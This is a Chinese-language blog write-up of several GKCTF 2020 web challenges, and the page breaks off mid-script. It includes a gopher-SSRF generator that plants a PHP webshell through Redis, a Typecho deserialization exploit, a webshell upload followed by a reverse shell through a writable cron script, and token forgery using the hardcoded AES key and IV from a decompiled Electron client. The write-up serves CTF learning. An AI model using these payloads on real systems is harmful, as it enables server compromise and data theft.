<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="gkctf-wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/atom.xml" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/05/24/gkctf-wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="gkctf-wp">
<meta property="og:url" content="https://glotozz.github.io/2020/05/24/gkctf-wp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/05/24/ANWj3vFomnElKS1.png">
<meta property="og:image" content="https://i.loli.net/2020/05/24/3vOQAXe2FgwLkUd.png">
<meta property="og:image" content="https://i.loli.net/2020/05/24/3biUKvAlp7Nfd1H.png">
<meta property="og:image" content="https://i.loli.net/2020/05/24/FNgJMcDjnPdqaSQ.png">
<meta property="og:image" content="https://i.loli.net/2020/05/24/dloMKaQBIS6pEkg.png">
<meta property="og:image" content="https://i.loli.net/2020/05/24/f2WL8KHevAO4EU5.png">
<meta property="og:image" content="https://i.loli.net/2020/05/24/5yrP3zH7TdALgQK.png">
<meta property="og:image" content="https://i.loli.net/2020/05/24/lkmzwjsVgWe3hDr.png">
<meta property="og:image" content="https://i.loli.net/2020/05/26/CsS7GcQI2pY4dTf.png">
<meta property="article:published_time" content="2020-05-24T07:50:41.000Z">
<meta property="article:modified_time" content="2020-05-25T17:10:43.932Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/24/ANWj3vFomnElKS1.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> gkctf-wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="glotozz'blog" type="application/atom+xml">
</head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          gkctf-wp
        
      </h1>

      <time class="post-time">
          May 24 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#ezweb">ezweb</a></li>
<li><a href="#cve版签到">CVE版签到</a></li>
<li><a href="#老八小超市儿">老八小超市儿</a></li>
<li><a href="#eznode">EzNode</a></li>
<li><a href="#eztypecho">EzTypecho</a></li>
<li><a href="#node-exe">Node-Exe</a></li>
</ul>
<!-- tocstop -->

<hr>
<h3><span id="ezweb">ezweb</span></h3><p>根据提示，扫了下c段</p>
<p><img src="https://i.loli.net/2020/05/24/ANWj3vFomnElKS1.png" alt="Snipaste_2020-05-24_15-20-43.png"></p>
<p>发现<code>.11</code>提示扫端口，猜测是redis</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020/5/24 15:22</span></span><br><span class="line"><span class="comment"># @Author  : glotozz</span></span><br><span class="line"><span class="comment"># @File    : 1.py</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.81.48.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n\n\n&lt;?php readfile('/flag');?&gt;\n\n\n\n"</span></span><br><span class="line">filename=<span class="string">"shell1.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>

<p>注意<code>%2A</code>后的需要再url编码一次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.81.48.11:6379&#x2F;_%2A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%250A%250A%253C%253Fphp%2520readfile%2528%2527%2Fflag%2527%2529%253B%253F%253E%250A%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252410%250D%250Ashell1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/24/3vOQAXe2FgwLkUd.png" alt="Snipaste_2020-05-24_15-45-15.png"></p>
<hr>
<h3><span id="cve版签到">CVE版签到</span></h3><p><code>hint:cve-2020-7066</code></p>
<blockquote>
<p> <a href="https://www.anquanke.com/vul/id/1966253" target="_blank" rel="noopener">https://www.anquanke.com/vul/id/1966253</a> </p>
<p>PHP（PHP：Hypertext Preprocessor，PHP：超文本预处理器）是PHPGroup和开放源代码社区的共同维护的一种开源的通用计算机脚本语言。该语言主要用于Web开发，支持多种数据库及操作系统。 PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的‘get_headers()’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。 </p>
</blockquote>
<blockquote>
<p><a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79329</a> </p>
</blockquote>
<p><img src="https://i.loli.net/2020/05/24/3biUKvAlp7Nfd1H.png" alt="Snipaste_2020-05-24_15-58-08.png"></p>
<p>改成<code>127.0.0.123</code>即可</p>
<hr>
<h3><span id="老八小超市儿">老八小超市儿</span></h3><blockquote>
<p><a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a> </p>
</blockquote>
<p>添加主题覆盖，访问shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4a90dbe1-4d3c-4496-b2c5-92a2aa446c4c.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/24/FNgJMcDjnPdqaSQ.png" alt="Snipaste_2020-05-24_16-23-36.png"></p>
<p>提示在<code>/root</code>，需要提权</p>
<p><code>system()</code>没被<code>disable_func</code>，提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">while true; do (python &#x2F;var&#x2F;mail&#x2F;makeflaghint.py &amp;) &amp;&amp; sleep 60; done</span><br></pre></td></tr></table></figure>

<p>正好<code>/var/mail/makeflaghint.py</code>的权限为<code>-rwxrw-rw-</code></p>
<p>直接修改这个文件反弹shell</p>
<p><img src="https://i.loli.net/2020/05/24/dloMKaQBIS6pEkg.png" alt="Snipaste_2020-05-24_16-38-45.png"></p>
<hr>
<h3><span id="eznode">EzNode</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;src&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;MIT&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;body-parser&quot;: &quot;1.19.0&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;4.17.1&quot;,</span><br><span class="line">    &quot;safer-eval&quot;: &quot;1.3.6&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.anquanke.com/vul/id/1783938" target="_blank" rel="noopener">https://www.anquanke.com/vul/id/1783938</a> </p>
</blockquote>
<p>先绕过de1ay</p>
<p><img src="https://i.loli.net/2020/05/24/f2WL8KHevAO4EU5.png" alt="Snipaste_2020-05-24_17-02-37.png"></p>
<p>传<code>9999999999999</code>超出Integer范围绕过判断</p>
<p>命令执行参考链接</p>
<p><img src="https://i.loli.net/2020/05/24/5yrP3zH7TdALgQK.png" alt="Snipaste_2020-05-24_17-10-17.png"></p>
<p>这里弹不了shell，网段不同</p>
<hr>
<h3><span id="eztypecho">EzTypecho</span></h3><p>老漏洞了，但是和原来的代码有些不同</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//session_start();</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">'no, you can\'t unserialize it without session QAQ'</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>注释了<code>session_start()</code>，后面要求存在<code>$_SESSION</code></p>
<p>发现后面还有一处，传<code>?start</code>即可</p>
<p><img src="https://i.loli.net/2020/05/24/lkmzwjsVgWe3hDr.png" alt="Snipaste_2020-05-24_18-58-40.png"></p>
<p>稍微改下exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">		<span class="keyword">private</span> $_type;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">    		<span class="keyword">$this</span>-&gt;_type = <span class="keyword">self</span>::RSS2;</span><br><span class="line">    		$item[<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">    		$item[<span class="string">'category'</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request());</span><br><span class="line">    		<span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = $item;</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="string">'/flag'</span>;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'readfile'</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">	$b = [<span class="string">'adapter'</span>=&gt;$a];</span><br><span class="line">	<span class="keyword">echo</span> urlencode(base64_encode(serialize($b)));</span><br></pre></td></tr></table></figure>

<p>===================看<code>byc_404</code>师傅看到还可以利用<strong>带上<code>php_session_upload_progress</code>上传文件，并且cookie带上PHPSESSID</strong>来绕过<code>$_SESSION</code></p>
<hr>
<h3><span id="node-exe">Node-Exe</span></h3><p>这题比较有意思</p>
<p>fiddler抓包</p>
<p>发现请求包如下，json格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;timestamp&quot;:1590324832000&#125;</span><br></pre></td></tr></table></figure>

<p>抓包修改<code>id=3</code>会提示hacker，猜测后端是<code>timestamp</code>校验，以及<code>token</code></p>
<p>尝试写脚本伪造<code>timestamp</code>发包，果然不成功。</p>
<p>两种思路，一反编译找到token生成的算法，二直接利用fiddler正则匹配id，替换为3后直接发包（类似于bp的<code>Match and Replace功能</code>），或者直接盲猜token加密算法。。</p>
<p>思路二历经千辛万苦成功了，修改fiddler script，成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(oSession.fullUrl.Contains(&quot;&#x2F;buyflag&quot;))&#123;&#x2F;&#x2F;根据fullUrl判断是否包含此串</span><br><span class="line">            var req &#x3D; oSession.GetRequestBodyAsString();</span><br><span class="line">            var reqJSON &#x3D; Fiddler.WebFormats.JSON.JsonDecode(req);</span><br><span class="line">            reqJSON.JSONObject[&#39;id&#39;]&#x3D;3;</span><br><span class="line">            &#x2F;&#x2F;var requestJson&#x3D;Fiddler.WebFormats.JSON.JsonDecode(mylogin);</span><br><span class="line">            var reJsonDes&#x3D;Fiddler.WebFormats.JSON.JsonEncode(reqJSON.JSONObject);</span><br><span class="line">            oSession.utilSetRequestBody(reJsonDes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然还是不行，说明token加密时用到了id参数，后端解密校验。</p>
<p>想看wp。。</p>
<p>=====================看了下评论</p>
<p>其实就是将程序解包，</p>
<p>解压安装文件，<code>app-64\resources\app.asar</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar e app.asar tmp</span><br></pre></td></tr></table></figure>

<p>核心代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">           encrypt: <span class="function"><span class="keyword">function</span>(<span class="params">e, i, t</span>) </span>&#123;</span><br><span class="line">               <span class="keyword">var</span> o = <span class="keyword">this</span>;</span><br><span class="line">               <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                   <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">                       <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (o.prev = o.next) &#123;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                           <span class="keyword">return</span> o.abrupt(<span class="string">"return"</span>, <span class="keyword">new</span> s.a((<span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">                               <span class="keyword">var</span> n = p.a.createCipheriv(<span class="string">"aes-128-cbc"</span>, e, i),</span><br><span class="line">                               r = n.update(t, <span class="string">"utf8"</span>, <span class="string">"binary"</span>);</span><br><span class="line">                               r += n.final(<span class="string">"binary"</span>),</span><br><span class="line">                               o(r = <span class="keyword">new</span> Buffer.from(r, <span class="string">"binary"</span>).toString(<span class="string">"hex"</span>))</span><br><span class="line">                           &#125;)));</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                       <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                           <span class="keyword">return</span> o.stop()</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;), n, o)</span><br><span class="line">               &#125;)))()</span><br><span class="line">           &#125;,</span><br><span class="line">           makeToken: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">               <span class="keyword">var</span> i = <span class="keyword">this</span>;</span><br><span class="line">               <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                   <span class="keyword">var</span> o, r;</span><br><span class="line">                   <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">                       <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.prev = t.next) &#123;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                           <span class="keyword">return</span> <span class="string">"31169fedc9a20ecf"</span>,</span><br><span class="line">                           <span class="string">"d96adeefaa0102a9"</span>,</span><br><span class="line">                           o = f()(n()(e)),</span><br><span class="line">                           t.next = <span class="number">5</span>,</span><br><span class="line">                           i.encrypt(<span class="string">"31169fedc9a20ecf"</span>, <span class="string">"d96adeefaa0102a9"</span>, o);</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                           <span class="keyword">return</span> r = t.sent,</span><br><span class="line">                           t.abrupt(<span class="string">"return"</span>, r);</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                       <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                           <span class="keyword">return</span> t.stop()</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;), t, i)</span><br><span class="line">               &#125;)))()</span><br><span class="line">           &#125;,</span><br><span class="line">           buyFlag: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">               <span class="keyword">var</span> i = <span class="keyword">this</span>;</span><br><span class="line">               <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                   <span class="keyword">var</span> o;</span><br><span class="line">                   <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">                       <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.prev = t.next) &#123;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                           <span class="keyword">return</span> o = &#123;</span><br><span class="line">                               id: e,</span><br><span class="line">                               timestamp: <span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>)</span><br><span class="line">                           &#125;,</span><br><span class="line">                           t.t0 = i.$http,</span><br><span class="line">                           t.t1 = i.url + <span class="string">"/buyflag"</span>,</span><br><span class="line">                           t.t2 = o,</span><br><span class="line">                           t.next = <span class="number">6</span>,</span><br><span class="line">                           i.makeToken(o);</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                           t.t3 = t.sent,</span><br><span class="line">                           t.t4 = &#123;</span><br><span class="line">                               token: t.t3</span><br><span class="line">                           &#125;,</span><br><span class="line">                           t.t5 = &#123;</span><br><span class="line">                               headers: t.t4</span><br><span class="line">                           &#125;,</span><br><span class="line">                           t.t6 = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                               i.$Modal.info(&#123;</span><br><span class="line">                                   title: <span class="string">"购买结果"</span>,</span><br><span class="line">                                   content: e.data[<span class="number">0</span>].flag</span><br><span class="line">                               &#125;)</span><br><span class="line">                           &#125;,</span><br><span class="line">                           t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                       <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                           <span class="keyword">return</span> t.stop()</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;), t, i)</span><br><span class="line">               &#125;)))()</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br></pre></td></tr></table></figure>

<p><code>encrypt</code>是aes加密</p>
<p><code>makeToken</code>中生成token，调用<code>encrypt()</code>，其中<code>e</code>、<code>i</code>给了，<code>o</code>是加密的数据，还有一层处理</p>
<p><code>o=f()(n()(e))</code>，这个是js的IIFE函数，在定义处便执行。</p>
<p>先AES解密看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e0ed8ab3d56b736bf326fcf5f232659f0b0a00d789c1066b0080994d0d20c487bc3a2d4e7ef5602c071b818e7c33b5c1</span><br><span class="line">解密&#x3D;&gt;</span><br><span class="line">abc50408dfb68e833bd7d460d0fe8fe0</span><br></pre></td></tr></table></figure>

<p>再测试md5加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &#39;&#123;&quot;id&quot;:1,&quot;timestamp&quot;:1590419048000&#125;&#39;;</span><br><span class="line">var_dump(json_decode($a));</span><br><span class="line">echo md5($a);</span><br></pre></td></tr></table></figure>

<p>结果相同，可以伪造</p>
<p>写了个python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 